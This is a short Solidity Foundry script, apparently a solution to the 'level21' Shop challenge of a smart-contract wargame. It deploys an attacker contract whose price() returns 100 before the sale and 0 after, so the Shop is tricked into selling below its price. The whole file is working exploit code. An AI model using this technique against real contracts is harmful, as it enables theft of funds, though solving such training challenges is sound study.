// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "src/level21.sol";

contract POC is Script {
    Shop level21;

    function setUp() external {
        level21 = Shop(0xE072d88DF681AFfe2407A1Dc3233d8eaC28D1143);
    }

    function run() public {
        vm.startBroadcast();

        ShopExploit attacker = new ShopExploit(level21);

        level21.isSold();
        level21.price();
        attacker.exploit();
        level21.isSold();
        level21.price();

        vm.stopBroadcast();
    }
}

contract ShopExploit {
    Shop shop;

    constructor(Shop _shop) public {
        shop = _shop;
    }

    function price() external view returns (uint256) {
        if (shop.isSold()) {
            return 0;
        } else {
            return 100;
        }
    }

    function exploit() public {
        shop.buy();
    }
}
